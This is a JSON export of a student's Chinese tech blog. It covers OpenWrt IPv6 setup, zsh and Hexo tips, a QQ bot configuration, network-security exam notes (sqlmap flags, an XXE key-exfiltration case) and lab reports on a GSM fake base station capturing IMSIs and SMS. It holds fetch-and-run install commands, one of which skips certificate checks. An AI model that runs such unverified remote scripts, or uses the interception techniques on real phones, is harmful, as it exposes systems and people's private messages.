href=\"#6-在luci界面设置vwan1\" class=\"headerlink\" title=\"6.在luci界面设置vwan1\"></a>6.在luci界面设置vwan1</h1><p>设置<code>vwan1</code>拨号用户名和密码，同时设置Firewall Setting为<code>wan</code>口firewire zone，保存。</p>\n<p>这里<code>vwan1</code>设置的是翼讯的账号和密码，格式为<code>t学号@dx</code>，或者添加转换后的账号<a href=\"https://note286.github.io/yixun/\" target=\"_blank\" rel=\"noopener\">在线转换地址</a>。</p>\n<h1 id=\"7-设置默认网关\"><a href=\"#7-设置默认网关\" class=\"headerlink\" title=\"7.设置默认网关\"></a>7.设置默认网关</h1><p>将原来的<code>wan</code>口设置为非默认路由，<code>vwan1</code>设置为默认路由，也就是<strong>易迅走默认网关 校园网不走</strong>，这样ipv4就只走易迅了，在<code>network-interface</code>里选择网口后edit，Advanced Settings，<code>Use default gateway</code>这个选项，<strong>易迅勾选，校园网不勾选</strong>。</p>\n<h1 id=\"8-最后设置后台转发ipv6\"><a href=\"#8-最后设置后台转发ipv6\" class=\"headerlink\" title=\"8.最后设置后台转发ipv6\"></a>8.最后设置后台转发ipv6</h1><h2 id=\"1-网络配置\"><a href=\"#1-网络配置\" class=\"headerlink\" title=\"1.网络配置\"></a>1.网络配置</h2><p>最好用vim自己添加 有的最后好像没有空行<br>添加以下内容到<code>/etc/sysctl.conf</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 添加以下内容</span></span><br><span class=\"line\">net.ipv6.conf.default.accept_ra=2</span><br><span class=\"line\">net.ipv6.conf.all.accept_ra=2</span><br></pre></td></tr></table></figure>\n\n<p>然后执行以下命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ uci <span class=\"built_in\">set</span> network.globals.ula_prefix=<span class=\"string\">\"<span class=\"variable\">$(uci get network.globals.ula_prefix | sed 's/^./d/')</span>\"</span></span><br><span class=\"line\">$ uci commit network</span><br><span class=\"line\">$ uci <span class=\"built_in\">set</span> dhcp.lan.ra_default=<span class=\"string\">'1'</span></span><br><span class=\"line\">$ uci commit dhcp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-添加nat6脚本\"><a href=\"#2-添加nat6脚本\" class=\"headerlink\" title=\"2.添加nat6脚本\"></a>2.添加nat6脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ touch /etc/init.d/nat6</span><br><span class=\"line\">$ chmod +x /etc/init.d/nat6</span><br><span class=\"line\">$ vim /etc/init.d/nat6</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-脚本内容\"><a href=\"#3-脚本内容\" class=\"headerlink\" title=\"3.脚本内容\"></a>3.脚本内容</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/bin/sh /etc/rc.common</span></span><br><span class=\"line\">START=75</span><br><span class=\"line\">ip6tables -t nat -I POSTROUTING -s `uci get network.globals.ula_prefix` -j MASQUERADE</span><br><span class=\"line\">route -A inet6 add 2000::/3 `route -A inet6 | grep ::/0 | awk <span class=\"string\">'NR==1&#123;print \"gw \"$2\" dev \"$7&#125;'</span>`</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"9-启动并重启\"><a href=\"#9-启动并重启\" class=\"headerlink\" title=\"9.启动并重启\"></a>9.启动并重启</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ /etc/init.d/nat6 <span class=\"built_in\">enable</span></span><br><span class=\"line\">$ reboot</span><br></pre></td></tr></table></figure>\n\n<p>最后，稍等几分钟就会有ipv6地址了，如果使用过程中发现ipv6没了，就到system-startup里找到<code>nat6</code>，重启路由器。可访问 <a href=\"http://test-ipv6.com/\" target=\"_blank\" rel=\"noopener\">http://test-ipv6.com/</a> 检测是否有ipv6地址。</p>\n<blockquote>\n<p>最后的最后，建议把<a href=\"https://raw.githubusercontent.com/googlehosts/hosts/master/hosts-files/hosts\" target=\"_blank\" rel=\"noopener\">hosts</a>添加到路由器里，这样所有设备就都可以用了，亲测iOS，安卓，macOS，win无线连接都可以使用ipv6，不需要额外配置。</p>\n</blockquote>\n","categories":[],"tags":["K2P"]},{"title":"zsh报错command not found compdef","url":"https://littleghost2016.github.io/2019/07/10/zsh报错command-not-found-compdef/","content":"<p>安装zsh后报错，解决方案：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ compaudit | xargs -I <span class=\"string\">'%'</span> chmod g-w,o-w <span class=\"string\">'%'</span></span><br><span class=\"line\">$ rm ~/.zcompdump*</span><br><span class=\"line\">$ <span class=\"built_in\">exec</span> zsh</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"VMWare虚拟机“锁定文件失败解决方法”","url":"https://littleghost2016.github.io/2019/07/10/VMWare虚拟机“锁定文件失败解决方法”/","content":"<p>2019年07月10日 </p>\n<p>实验室突然断电导致开启虚拟机时报错<code>另一个程序已锁定文件的一部分</code>。</p>\n<h1 id=\"分析原因：\"><a href=\"#分析原因：\" class=\"headerlink\" title=\"分析原因：\"></a>分析原因：</h1><p>虚拟机在运行的过程中会锁定文件，以防止文件被修改。当出现突然断电或者本地系统崩溃时，虚拟机无法及时地解除对于虚拟机文件的锁定，当再次启动时就会出现如上现象。</p>\n<h1 id=\"解决方法：\"><a href=\"#解决方法：\" class=\"headerlink\" title=\"解决方法：\"></a>解决方法：</h1><p>将<code>.lck</code>结尾的文件夹删除。</p>\n","categories":[],"tags":["vmware"]},{"title":"Hello World","url":"https://littleghost2016.github.io/2019/07/09/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","categories":[],"tags":[]},{"title":"MojoQQ","url":"https://littleghost2016.github.io/2018/09/21/MojoQQ/","content":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openssl libssl-dev</span><br><span class=\"line\">sudo wget  http://xrl.us/cpanm  --no-check-certificate -O /sbin/cpanm &amp;&amp; chmod +x  /sbin/cpanm</span><br><span class=\"line\">sudo chmod 755 /sbin/cpanm</span><br><span class=\"line\">sudo cpanm Mojo::Webqq</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim Mojoqq/qq1.pl</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight perl\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> Mojo::Webqq;</span><br><span class=\"line\"><span class=\"comment\">#微信使用 use Mojo::Weixin</span></span><br><span class=\"line\"><span class=\"keyword\">my</span> $client = Mojo::Webqq-&gt;new(<span class=\"string\">log_encoding=&gt;</span><span class=\"string\">\"utf-8\"</span>);</span><br><span class=\"line\">$client-&gt;load(<span class=\"string\">\"ShowMsg\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#以下为 MiPush 推送</span></span><br><span class=\"line\">$client-&gt;load(<span class=\"string\">\"MiPush\"</span>,<span class=\"string\">data=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"string\">registration_ids=&gt;</span>[<span class=\"string\">\"FP5FHPzvfB1p3lntV75WgycDuAVwWExmsHa8vQn0NuKniv4kjkHM1aIraZWYh/mF\"</span>],</span><br><span class=\"line\">    <span class=\"comment\"># allow_group=&gt;[\"\"],</span></span><br><span class=\"line\">    <span class=\"comment\"># ban_group=&gt;[],</span></span><br><span class=\"line\">    <span class=\"comment\"># allow_discuss=&gt;[],</span></span><br><span class=\"line\">    <span class=\"comment\"># ban_discuss=&gt;[],</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$client-&gt;load(<span class=\"string\">\"Openqq\"</span>,<span class=\"string\">data=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">#如果是微信改为 Openwx</span></span><br><span class=\"line\">    <span class=\"string\">listen =&gt;</span> [&#123;<span class=\"string\">host=&gt;</span><span class=\"string\">\"0.0.0.0\"</span>,<span class=\"string\">port=&gt;</span><span class=\"number\">1098</span>&#125;, ] ,</span><br><span class=\"line\">    <span class=\"comment\">#如果是推送微信的话需要保证端口不重复，并请保证所设定的端口已经在防火墙内放行，同时需要在 APP 内设定好推送服务器的地址和端口</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">#不需要 APP 内回复功能请删除以上三行（不包括被 # 号注释掉的几行）</span></span><br><span class=\"line\">$client-&gt;run();</span><br></pre></td></tr></table></figure>","categories":["技术"],"tags":["qq"]},{"title":"网络对抗原理复习整理","url":"https://littleghost2016.github.io/2018/08/20/网络对抗原理复习整理/","content":"<h1 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h1><ul>\n<li>oN/oX</li>\n</ul>\n<h1 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h1><ul>\n<li>-c</li>\n<li>-i</li>\n<li>-s</li>\n<li>-t</li>\n</ul>\n<h1 id=\"tcpdump\"><a href=\"#tcpdump\" class=\"headerlink\" title=\"tcpdump\"></a>tcpdump</h1><ul>\n<li><p>-i 使标准输出变为缓冲行形式 </p>\n</li>\n<li><p>-e 在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议 </p>\n</li>\n<li><p>-c</p>\n</li>\n<li><p>-w 包写入文件中，不打印</p>\n</li>\n<li><p>-n 域名转换成IP地址后显示 ，不把网络地址转换成名字 </p>\n</li>\n<li><p>-nn 每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号 </p>\n</li>\n<li><p>-v[v] 输出详细的报文信息 </p>\n</li>\n<li><p>-X[X] 以16进制[ASCII]展示</p>\n</li>\n</ul>\n<h1 id=\"DDoS\"><a href=\"#DDoS\" class=\"headerlink\" title=\"DDoS\"></a>DDoS</h1><h2 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h2><ul>\n<li><p>不校验来源</p>\n</li>\n<li><p>返回比请求大</p>\n</li>\n</ul>\n<h2 id=\"例如\"><a href=\"#例如\" class=\"headerlink\" title=\"例如\"></a>例如</h2><ul>\n<li>NTP</li>\n<li>BT</li>\n<li>DNS</li>\n</ul>\n<h2 id=\"CC-过量访问\"><a href=\"#CC-过量访问\" class=\"headerlink\" title=\"CC/ 过量访问\"></a>CC/ 过量访问</h2><ul>\n<li>低于带宽，高于处理能力</li>\n</ul>\n<h2 id=\"清洗\"><a href=\"#清洗\" class=\"headerlink\" title=\"清洗\"></a>清洗</h2><h3 id=\"四层清洗\"><a href=\"#四层清洗\" class=\"headerlink\" title=\"四层清洗\"></a>四层清洗</h3><ul>\n<li><p>支持非 HTTP 流量</p>\n</li>\n<li><p>不需要 SSL 证书</p>\n</li>\n</ul>\n<h3 id=\"七层清洗\"><a href=\"#七层清洗\" class=\"headerlink\" title=\"七层清洗\"></a>七层清洗</h3><ul>\n<li>支持防 CC</li>\n<li>细粒度清洗</li>\n</ul>\n<h2 id=\"防御方法\"><a href=\"#防御方法\" class=\"headerlink\" title=\"防御方法\"></a>防御方法</h2><ul>\n<li>准备备用 IP （回源 IP ）</li>\n<li>配置回源 IP ACL ，白名单</li>\n<li>配置供应商高防 IP 与回源策略</li>\n<li>测试真实 IP 透传</li>\n<li>制定预案与响应策略</li>\n<li>演练</li>\n<li>供应商选择与商务谈判</li>\n</ul>\n<h1 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h1><h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h2><ul>\n<li>-r REQUESTFILE 从一个文件中载入HTTP请求 </li>\n<li>-level 执行测试的等级 </li>\n<li>-risk 执行测试的风险</li>\n<li>–current-user 检索数据库管理系统当前用户 </li>\n<li>-technique BEUST</li>\n<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） </li>\n<li>–dbms=DBMS 强制后端的DBMS为此值 </li>\n</ul>\n<h1 id=\"防御体系构建\"><a href=\"#防御体系构建\" class=\"headerlink\" title=\"防御体系构建\"></a>防御体系构建</h1><ul>\n<li>让系统更规范</li>\n<li>加强对信息的掌握</li>\n<li>安全评估</li>\n<li>入侵检测</li>\n<li>及时响应</li>\n</ul>\n<h1 id=\"渗透路径的启示\"><a href=\"#渗透路径的启示\" class=\"headerlink\" title=\"渗透路径的启示\"></a>渗透路径的启示</h1><h2 id=\"启示\"><a href=\"#启示\" class=\"headerlink\" title=\"启示\"></a>启示</h2><ul>\n<li>网络访问的隔离与限制</li>\n<li>漏洞的发现和利用</li>\n<li>账号与权限</li>\n</ul>\n<h2 id=\"分层\"><a href=\"#分层\" class=\"headerlink\" title=\"分层\"></a>分层</h2><ul>\n<li><p>客户端安全</p>\n</li>\n<li><p>网络与系统安全</p>\n</li>\n<li><p>应用安全</p>\n</li>\n<li><p>业务安全</p>\n</li>\n<li><p>数据安全</p>\n</li>\n</ul>\n<h2 id=\"安全域划分\"><a href=\"#安全域划分\" class=\"headerlink\" title=\"安全域划分\"></a>安全域划分</h2><table>\n<thead>\n<tr>\n<th align=\"center\">网络准入</th>\n<th>←</th>\n<th>外网</th>\n<th>←→</th>\n<th>端口管理</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">↓</td>\n<td></td>\n<td></td>\n<td></td>\n<td>↑↓</td>\n</tr>\n<tr>\n<td align=\"center\">办公网</td>\n<td>→</td>\n<td>跳板机</td>\n<td>→</td>\n<td>内网</td>\n</tr>\n</tbody></table>\n<h2 id=\"审计\"><a href=\"#审计\" class=\"headerlink\" title=\"审计\"></a>审计</h2><ul>\n<li>事前：风险评估、资格评估</li>\n<li>事中：入侵检测</li>\n<li>事后：追溯 + 制度</li>\n</ul>\n<h2 id=\"检测方式\"><a href=\"#检测方式\" class=\"headerlink\" title=\"检测方式\"></a>检测方式</h2><ul>\n<li><p>误用检测 - 黑名单</p>\n</li>\n<li><p>异常检测 - 白名单</p>\n</li>\n</ul>\n<h1 id=\"2018年安全事件\"><a href=\"#2018年安全事件\" class=\"headerlink\" title=\"2018年安全事件\"></a>2018年安全事件</h1><p>微信支付SDK的XXE漏洞，语言为JAVA，查看SDK给的README.md说明，其中表示在支付结果的回掉接口notify_url 处使用，向商户的notify_url接口发送dtd脏数据，商户服务器加载远程dtd文件，商户服务器将key值发送至attack服务器。漏洞本身只是很简单的XXE漏洞造成的任意文件读取，因为漏洞所处的关键业务点使得造成的损失巨大，但是由于notify_url的使用过程中客户全程并不参与，所以在我看来notify_url的获取方式是该漏洞破坏性的瓶颈。 </p>\n<h1 id=\"防止SQL注入\"><a href=\"#防止SQL注入\" class=\"headerlink\" title=\"防止SQL注入\"></a>防止SQL注入</h1><h2 id=\"1-过滤-转义\"><a href=\"#1-过滤-转义\" class=\"headerlink\" title=\"1.过滤/转义\"></a>1.过滤/转义</h2><ul>\n<li>防火墙：直接加在客户端和服务端中间，不修改原有的框架或者体系，防火墙可以插件的方式加入并启用功能。缺点：性能好的waf比较贵。</li>\n<li>修改代码：可根据是实际情况修改。缺点：需要技术支持。</li>\n</ul>\n<h2 id=\"2-参数化\"><a href=\"#2-参数化\" class=\"headerlink\" title=\"2.参数化\"></a>2.参数化</h2><h1 id=\"服务器被攻击\"><a href=\"#服务器被攻击\" class=\"headerlink\" title=\"服务器被攻击\"></a>服务器被攻击</h1><h2 id=\"1-分析\"><a href=\"#1-分析\" class=\"headerlink\" title=\"1.分析\"></a>1.分析</h2><ul>\n<li>22：SSH登陆密码泄露。密码被记录在纸上/云笔记上/github上；弱密码；被运维人员交易。</li>\n<li>80：上传文件漏洞，僵尸程序被上传了。</li>\n<li>6397：Redis对外开放，可能有漏洞被利用。</li>\n</ul>\n<h2 id=\"2-紧急处理\"><a href=\"#2-紧急处理\" class=\"headerlink\" title=\"2.紧急处理\"></a>2.紧急处理</h2><ul>\n<li>22：关闭SSH端口，更换密码。</li>\n<li>80：代码审计。</li>\n<li>6379：关闭端口。</li>\n</ul>\n<h2 id=\"3-进一步加固\"><a href=\"#3-进一步加固\" class=\"headerlink\" title=\"3.进一步加固\"></a>3.进一步加固</h2><ul>\n<li><p>22：转移端口，加强密码管理。</p>\n</li>\n<li><p>80：更换成HTTPS服务。</p>\n</li>\n<li><p>6379：禁止Redis服务端口对外开放。</p>\n</li>\n<li><p>22和6379只对内部办公网开放，办公网要连接SSH和Redis都要经过跳板机。外网连接内网要通过VPN。</p>\n</li>\n</ul>\n<h1 id=\"SaaS和私有化部署讨论\"><a href=\"#SaaS和私有化部署讨论\" class=\"headerlink\" title=\"SaaS和私有化部署讨论\"></a>SaaS和私有化部署讨论</h1><blockquote>\n<p>以下为个人浅显的理解。</p>\n</blockquote>\n<p>题目：SaaS部署的系统（例如CRM系统、ERP系统）和私有化部署在安全性上有什么差异，请就此进行多维度、全面、利弊关系的分析，并说明企业如何决策选择合适的部署模式？</p>\n<h2 id=\"Safety\"><a href=\"#Safety\" class=\"headerlink\" title=\"Safety\"></a>Safety</h2><p>「SaaS」一般为大型机房，服务提供商一般会考虑到机房自身的承受突发自然灾害、承受断电断网、人为损害等物理伤害的因素，保证自己能提供不间断服务，或者代价不大的自身升级。</p>\n<p>「私有化部署」中大型企业有自己的机房，情况大体同「SaaS」。小企业的机房选址可能并不能满足所有的最有条件，可能会出现自然灾害、断电断网、人为伤害等的情况。</p>\n<h2 id=\"Security\"><a href=\"#Security\" class=\"headerlink\" title=\"Security\"></a>Security</h2><h3 id=\"1-软件安全\"><a href=\"#1-软件安全\" class=\"headerlink\" title=\"1.软件安全\"></a>1.软件安全</h3><p>「SaaS」可及时升级自身的软件版本来修复漏洞或者升级功能。</p>\n<p>「私有化部署」可能不能及时更新软件，导致漏洞在网络上大范围传播后仍可在私有化部署的平台进行攻击。</p>\n<h3 id=\"2-数据安全\"><a href=\"#2-数据安全\" class=\"headerlink\" title=\"2.数据安全\"></a>2.数据安全</h3><p>「SaaS」一般提供更强的数据防护能力。若各个所提供的服务间隔离被打破（或者未做有效保障互相关联时的安全措施），则有可能因其中的某一数据而导致其他服务数据泄露，即有可能会出现“千里之堤，溃于蚁穴”的安全状况。</p>\n<p>「私有化部署」单从自身企业的角度来看，可能会使自己的数据泄露；但规模和「SaaS」部署的情况比，会小很多。</p>\n<h3 id=\"3-运行环境安全\"><a href=\"#3-运行环境安全\" class=\"headerlink\" title=\"3.运行环境安全\"></a>3.运行环境安全</h3><p>「SaaS」作为服务提供商，一般会比「私有化部署」提供更多一点的安全措施，包括更有效的防火墙规则、更强的加密方式、抵御更多DDoS流量、反爬虫、防注入挂马等能力。</p>\n<h3 id=\"4-数据恢复\"><a href=\"#4-数据恢复\" class=\"headerlink\" title=\"4.数据恢复\"></a>4.数据恢复</h3><p>「SaaS」一般提供及时的数据恢复功能。</p>\n<p>「私有化部署」可能受限于自身规模而不能恢复最近可用的数据（如西电睿思曾因为一次硬盘使用时间过长损耗过度导致数据丢失，所有数据被迫恢复到半年以前的数据）。</p>\n<h3 id=\"5-用户管理和登陆\"><a href=\"#5-用户管理和登陆\" class=\"headerlink\" title=\"5.用户管理和登陆\"></a>5.用户管理和登陆</h3><p>「SaaS」一般提供完整的3A认证方案。</p>\n<p>「私有化部署」不一定会有完善的认证方式。</p>\n","categories":["技术"],"tags":["网络对抗原理"]},{"title":"安装zsh以及oh-my-zsh","url":"https://littleghost2016.github.io/2018/07/21/安装zsh以及oh-my-zsh/","content":"<h1 id=\"zsh\"><a href=\"#zsh\" class=\"headerlink\" title=\"zsh\"></a>zsh</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo apt install zsh git</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"oh-my-zsh\"><a href=\"#oh-my-zsh\" class=\"headerlink\" title=\"oh-my-zsh\"></a>oh-my-zsh</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sh -c <span class=\"string\">\"<span class=\"variable\">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># or </span></span><br><span class=\"line\"></span><br><span class=\"line\">$ sh -c <span class=\"string\">\"<span class=\"variable\">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>\"</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"zsh替换bash\"><a href=\"#zsh替换bash\" class=\"headerlink\" title=\"zsh替换bash\"></a>zsh替换bash</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim ~/.bash_profile</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">exec zsh</span><br><span class=\"line\">source ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更改配置\"><a href=\"#更改配置\" class=\"headerlink\" title=\"更改配置\"></a>更改配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#ZSH_THEME=&quot;rubbyrussell&quot;</span><br><span class=\"line\">ZSH_THEME=&quot;ys&quot;</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["zsh"]},{"title":"无线网络安全上机作业","url":"https://littleghost2016.github.io/2018/07/17/无线网络安全上机作业/","content":"<h1 id=\"实验5-AM-信号接收解调\"><a href=\"#实验5-AM-信号接收解调\" class=\"headerlink\" title=\"实验5  AM 信号接收解调\"></a>实验5  AM 信号接收解调</h1><h2 id=\"一、AM信号调制解调的原理\"><a href=\"#一、AM信号调制解调的原理\" class=\"headerlink\" title=\"一、AM信号调制解调的原理\"></a>一、AM信号调制解调的原理</h2><p>使用另一余弦信号，对AM信号进行频谱搬移，通过带通滤波器滤除其他信号，然后对信号进行解调，即可收听解调后的AM信号。</p>\n<h2 id=\"二、信号流程图及波形\"><a href=\"#二、信号流程图及波形\" class=\"headerlink\" title=\"二、信号流程图及波形\"></a>二、信号流程图及波形</h2><ol>\n<li>连接“File Source、Throttle、WX GUI FFT Sink”模块</li>\n</ol>\n<p><img src=\"5-1.png\" alt></p>\n<ol start=\"2\">\n<li>使用一个 Variable 模块和“Rational Resampler”模块</li>\n</ol>\n<p><img src=\"5-2.png\" alt></p>\n<ol start=\"3\">\n<li>增加一个带通滤波器滤除其他的信号</li>\n</ol>\n<p><img src=\"5-3.png\" alt></p>\n<ol start=\"4\">\n<li>使用“Complex to Mag”模块将复数信号转为实数信号</li>\n</ol>\n<p><img src=\"5-4.png\" alt></p>\n<ol start=\"5\">\n<li>加入“audio sink、WX GUI scope sink”</li>\n</ol>\n<p><img src=\"5-5.png\" alt></p>\n<p>6.加入衰减器模块“Multiply Const”，同时使用“WX GUI Slider”模块调节输入扬声器的信号功率</p>\n<p><img src=\"5-6.png\" alt></p>\n<p>7.乘以一个余弦信号进行频谱的搬移</p>\n<p><img src=\"5-7-1.png\" alt></p>\n<p><img src=\"5-7-2.png\" alt></p>\n<ol start=\"8\">\n<li>增加自动增益控制模块（ACG2）以及调节频率的 slider 模块</li>\n</ol>\n<p><img src=\"5-8-1.png\" alt></p>\n<h2 id=\"三、AM电台的中心频率频谱图\"><a href=\"#三、AM电台的中心频率频谱图\" class=\"headerlink\" title=\"三、AM电台的中心频率频谱图\"></a>三、AM电台的中心频率频谱图</h2><p><img src=\"5-8-2.png\" alt></p>\n<hr>\n<h1 id=\"实验6-FM广播接收机及频谱分析\"><a href=\"#实验6-FM广播接收机及频谱分析\" class=\"headerlink\" title=\"实验6 FM广播接收机及频谱分析\"></a>实验6 FM广播接收机及频谱分析</h1><h2 id=\"一、USRP设备信息呈现-uhd-find-devices\"><a href=\"#一、USRP设备信息呈现-uhd-find-devices\" class=\"headerlink\" title=\"一、USRP设备信息呈现 uhd_find_devices\"></a>一、USRP设备信息呈现 uhd_find_devices</h2><p><img src=\"6-1.png\" alt></p>\n<h2 id=\"二、谱分析流程图\"><a href=\"#二、谱分析流程图\" class=\"headerlink\" title=\"二、谱分析流程图\"></a>二、谱分析流程图</h2><p><img src=\"6-2.png\" alt></p>\n<h2 id=\"三、FM调制与解调的原理\"><a href=\"#三、FM调制与解调的原理\" class=\"headerlink\" title=\"三、FM调制与解调的原理\"></a>三、FM调制与解调的原理</h2><p>接收广播信号，用重采样将接收到的信号数据速率与声卡采样速率匹配，最后用宽带调频接收对FM信号进行解调。</p>\n<h2 id=\"四、FM收音机流程图\"><a href=\"#四、FM收音机流程图\" class=\"headerlink\" title=\"四、FM收音机流程图\"></a>四、FM收音机流程图</h2><p><img src=\"6-3.png\" alt></p>\n<h2 id=\"五、收听频道的频谱\"><a href=\"#五、收听频道的频谱\" class=\"headerlink\" title=\"五、收听频道的频谱\"></a>五、收听频道的频谱</h2><p><img src=\"6-4.png\" alt></p>\n<h1 id=\"实验7-伪基站搭建与-IMSI-捕获\"><a href=\"#实验7-伪基站搭建与-IMSI-捕获\" class=\"headerlink\" title=\"实验7 伪基站搭建与 IMSI 捕获\"></a>实验7 伪基站搭建与 IMSI 捕获</h1><h2 id=\"一、伪基站\"><a href=\"#一、伪基站\" class=\"headerlink\" title=\"一、伪基站\"></a>一、伪基站</h2><p>存在的原因：伪基站工作原理主要是利用了移动通信GSM系统设计上手机和基站之间连接的单向认证机制的缺陷，而2G网络就是基于GMS系统的。<br>CDMA2000、3G、4G不存在伪基站。</p>\n<h2 id=\"二、OpenBTS编译成功\"><a href=\"#二、OpenBTS编译成功\" class=\"headerlink\" title=\"二、OpenBTS编译成功\"></a>二、OpenBTS编译成功</h2><p><img src=\"7-1.png\" alt></p>\n<p>三、连接到本基站的手机IMSI截图</p>\n<p><img src=\"7-2.png\" alt></p>\n<p>四、短信截图</p>\n<p><img src=\"7-3.png\" alt></p>\n<h1 id=\"实验8-使用gr-gsm进行GSM数据捕获及分析\"><a href=\"#实验8-使用gr-gsm进行GSM数据捕获及分析\" class=\"headerlink\" title=\"实验8 使用gr-gsm进行GSM数据捕获及分析\"></a>实验8 使用gr-gsm进行GSM数据捕获及分析</h1><h2 id=\"一、当前位置基站信息截图\"><a href=\"#一、当前位置基站信息截图\" class=\"headerlink\" title=\"一、当前位置基站信息截图\"></a>一、当前位置基站信息截图</h2><p><img src=\"exp8_1.png\" alt></p>\n<h2 id=\"二、实时捕获数据的wireshark截图\"><a href=\"#二、实时捕获数据的wireshark截图\" class=\"headerlink\" title=\"二、实时捕获数据的wireshark截图\"></a>二、实时捕获数据的wireshark截图</h2><p><img src=\"8-2.png\" alt></p>\n<h2 id=\"三、下行短信截图\"><a href=\"#三、下行短信截图\" class=\"headerlink\" title=\"三、下行短信截图\"></a>三、下行短信截图</h2><p><img src=\"8-3.png\" alt></p>\n<h2 id=\"四、为什么可以获得其他用户短信信息？\"><a href=\"#四、为什么可以获得其他用户短信信息？\" class=\"headerlink\" 